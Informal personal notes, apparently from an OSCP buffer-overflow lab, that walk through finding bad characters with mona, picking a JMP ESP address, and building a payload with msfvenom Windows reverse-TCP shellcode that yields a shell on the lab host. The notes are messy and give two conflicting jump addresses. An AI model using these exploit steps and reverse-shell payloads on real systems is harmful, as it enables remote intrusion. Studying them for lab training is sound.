skip to find bad char...because my cherry tree notes crashed somhow....i was about to take note's using screen shoe but that's not happen.Fucking cheryy tree..

As we got four bad chars let's use mona to add in arrey using -b bytearrey 'badchar'
our_badchar=\x00\x07\x2e\xa0

and send the payload again and verify the badchar...if on popup saying undefind that means there is no bad char...

Now to get the jump eip we need to check the !mona modules

if there is all false in popup window that means that module of the app is vulnrable...

now find the jump esp ....

 !mona find -s "\xff\xe4" -m somvuln.dll 

this will retun the address of jump eip
   save the jump eip 311712f3 set this eip in payload as
   eip=eip= '\xf3\x12\x17\x31'
in this case...
#jmp 0x625011af
to little indian form

jmp="\xaf\x11\x50\x62"



creating the shellcode.. 
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.5.14 LPORT=1234 -b '\x00\x07\x2e\xa0' -f c

and copyt the output and paste in our program as shellcode value..

now payload is.....


'A'*offsetvalue
jmp="\xaf\x11\x50\x62"
nopt='\x90'*10
shellcode=msfoutput

start the listener and send the payload...

got the shell 

C:\Users\admin\Desktop\vulnerable-apps\oscp>whoami
whoami
oscp-bof-prep\admin





